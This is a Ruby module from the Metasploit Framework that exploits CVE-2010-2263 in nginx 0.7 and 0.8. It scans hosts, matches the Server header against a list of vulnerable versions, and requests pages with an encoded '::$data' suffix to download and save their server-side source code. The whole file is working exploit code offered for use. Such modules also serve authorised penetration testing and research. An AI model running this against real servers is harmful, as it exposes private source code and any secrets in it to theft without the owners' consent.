##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Nginx Source Code Disclosure/Download',
			'Description'    => %q{
					This module exploits a source code disclosure/download vulnerability in
				versions 0.7 and 0.8 of the nginx web server. Versions 0.7.66 and 0.8.40
				correct this vulnerability.
			},
			'References'     =>
				[
					[ 'CVE', '2010-2263' ],
					[ 'OSVDB', '65531' ],
					[ 'BID', '40760' ],
					[ 'EDB', '13818' ],
					[ 'EDB', '13822' ]
				],
			'Author'         =>
				[
					'Alligator Security Team',
					'Tiago Ferreira <tiago.ccna[at]gmail.com>',
				],
			'License'        =>  MSF_LICENSE)

		register_options(
			[
				OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
				OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
			], self.class)
	end

	def target_url
		uri = normalize_uri(datastore['URI'])
		"http://#{vhost}:#{rport}#{uri}"
	end

	def run_host(ip)
		uri = normalize_uri(datastore['URI'])
		path_save = datastore['PATH_SAVE']

		vuln_versions = [
			# 0.7
			"nginx/0.7.56","nginx/0.7.58","nginx/0.7.59",
			"nginx/0.7.60","nginx/0.7.61","nginx/0.7.62",
			"nginx/0.7.63","nginx/0.7.64","nginx/0.7.65",
			# 0.8
			"nginx/0.8.33","nginx/0.8.34","nginx/0.8.35",
			"nginx/0.8.36","nginx/0.8.37","nginx/0.8.38",
			"nginx/0.8.39"
		]

		get_source = Rex::Text.uri_encode("::$data")

		begin
			res = send_request_raw(
				{
					'method'  => 'GET',
					'uri'     => "#{uri}#{get_source}",
				}, 25)

			if res.nil?
				print_error("Connection timed out")
				return
			else
				version = res.headers['Server']
				http_fingerprint({ :response => res })
			end

			if vuln_versions.include?(version)
				print_good("#{target_url} - nginx - Vulnerable version: #{version}")

				if (res and res.code == 200)

					print_good("#{target_url} - nginx - Getting the source of page #{uri}")

					save_source = File.new("#{path_save}#{uri}","w")
					save_source.puts(res.body.to_s)
					save_source.close

					print_status("#{target_url} - nginx - File successfully saved: #{path_save}#{uri}")	if (File.exists?("#{path_save}#{uri}"))

				else
					print_error("http://#{vhost}:#{rport} - nginx - Unrecognized #{res.code} response")
					return

				end

			else
				if version =~ /nginx/
					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}")
				else
					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not ngnix")
				end
				return

			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end

end
